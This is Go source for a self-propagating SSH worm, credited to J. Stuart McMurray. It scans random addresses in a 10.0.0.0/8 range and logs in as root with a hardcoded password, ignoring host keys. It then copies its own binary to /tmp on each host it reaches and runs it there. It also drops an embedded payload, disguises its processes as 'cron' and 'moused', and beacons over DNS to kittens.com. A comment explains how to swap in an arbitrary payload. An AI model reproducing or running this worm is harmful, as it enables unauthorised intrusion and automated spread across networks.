// Program sshdropper is an SSH worm which drops a payload
package main

/*
 * sshdropper.go
 * SSH worm which drops a payload
 * By J. Stuart McMurray
 * Created 20191005
 * Last Modified 20191009
 */

import (
	"bytes"
	"crypto/rand"
	"errors"
	"fmt"
	"io/ioutil"
	"log"
	"net"
	"os"
	"os/exec"
	"path/filepath"
	"strconv"
	"time"

	"golang.org/x/crypto/ssh"
)

var (
	username   = "root"            /* SSH username */
	password   = "passw0rd"        /* SSH port */
	firstOctet = "10"              /* First octet in attacked IPs */
	port       = "22"              /* SSH port */
	mutexAddr  = "127.0.0.1:31337" /* Prevents running multiple times */
	nAttackers = 64                /* Number of concurrent attackers */
	timeout    = time.Minute       /* Connect timeout */
	hbInt      = time.Hour         /* Heartbeat interval */
	hbDom      = "kittens.com"     /* Heartbeat DNS domain */
	payloadBin = "moused"          /* Paylod process name */
	wormBin    = "cron"            /* Worm process name */
)

/* Will contain /proc/self/exe */
var worm []byte

func main() {

	/* Grab a listening socket as a cheesy mutex */
	l, err := net.Listen("tcp", mutexAddr)
	if nil != err {
		log.Fatalf("Error listening on mutex address: %v", err)
	}
	log.Printf("Mutex address: %v", l.Addr())

	/* Drop payload */
	go runPayload()

	/* Read in this binary for propagation */
	worm, err = ioutil.ReadFile("/proc/self/exe")
	if nil != err {
		log.Fatalf("Unable to read worm binary: %v", err)
	}
	log.Printf("Read in worm binary")

	/* Roll a config to auth with one set of creds */
	conf := &ssh.ClientConfig{
		User: username,
		Auth: []ssh.AuthMethod{
			ssh.Password(password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         timeout,
	}

	/* Start a few attackers */
	for i := 0; i < nAttackers; i++ {
		go attacker(conf)
	}

	/* Let the user know we're alive every so often */
	var de *net.DNSError
	for {
		q := strconv.FormatInt(
			time.Now().UnixNano(),
			36,
		) + "." + hbDom
		if _, err := net.LookupIP(q); nil != err &&
			!(errors.As(err, &de) && de.IsNotFound) {
			log.Printf("Error looking up %s: %v", q, err)
		}
		time.Sleep(hbInt)
	}
}

/* attacker tries to spread and drop a binary to random hosts in the /8 */
func attacker(conf *ssh.ClientConfig) {
	ab := make([]byte, 3) /* Address buffer */
	for {
		/* Work out the address to attack */
		if _, err := rand.Read(ab); nil != err {
			log.Fatalf("Error getting random address: %v", err)
		}
		t := fmt.Sprintf(
			"%s.%d.%d.%d",
			firstOctet,
			ab[0],
			ab[1],
			ab[2],
		)
		t = net.JoinHostPort(t, port)
		if err := attack(conf, t); nil != err {
			log.Printf("[%v] Fail: %v", t, err)
		}
	}
}

/* attack tries the config against t.  If it succeeds it spreads itself. */
func attack(conf *ssh.ClientConfig, t string) error {
	/* Try to connect to the target */
	c, err := ssh.Dial("tcp", t, conf)
	if nil != err {
		return err
	}
	defer c.Close()
	log.Printf("[%s] Authenticated", t)

	/* Upload ourselves */
	sess, err := c.NewSession()
	if nil != err {
		return err
	}
	sess.Stdin = bytes.NewReader(worm)
	o, err := sess.CombinedOutput(
		"cat >/tmp/" + payloadBin + " && " +
			"cd /tmp && " +
			"chmod 0700 " + payloadBin + " && " +
			"/bin/sh -c './" + payloadBin + " &'",
	)
	if 0 != len(o) {
		log.Printf("[%s] Command output: %q", t, o)
	}
	return err
}

/* runPayload starts the payload running */
func runPayload() {
	/* Write the payload to disk */
	fn := filepath.Join(os.TempDir(), payloadBin) /* Dropped file's name */
	if err := ioutil.WriteFile(fn, []byte(payload), 0700); nil != err {
		log.Printf("Error writing payload to %s: %v", fn, err)
		return
	}
	log.Printf("Wrote payload to %v", fn)

	/* Run payload */
	cmd := exec.Command(
		"/bin/sh",
		"-c",
		fn+" &",
	)
	if err := cmd.Start(); nil != err {
		log.Printf("Error starting payload: %v", err)
	}
	log.Printf("Started payload")
	if err := cmd.Wait(); nil != err {
		log.Printf("Error waiting for payload: %v", err)
	}
}

/* payload will be dropped and executed on each target.  It doesn't
 * have to be a script.  The following perl one-liner can be used to
 * generate a payload to embed:
 *
 *  perl -E '$"="\\x";$/=\16;say q{const payload = "" +};say qq{\t"\\x@{[unpack"(H2)*"]}` +}for(<>);say qq{\t""}' <./payload
 *
 * The output should replace the small script below.
 */
const payload = "#!/bin/sh\ndate > /tmp/t"
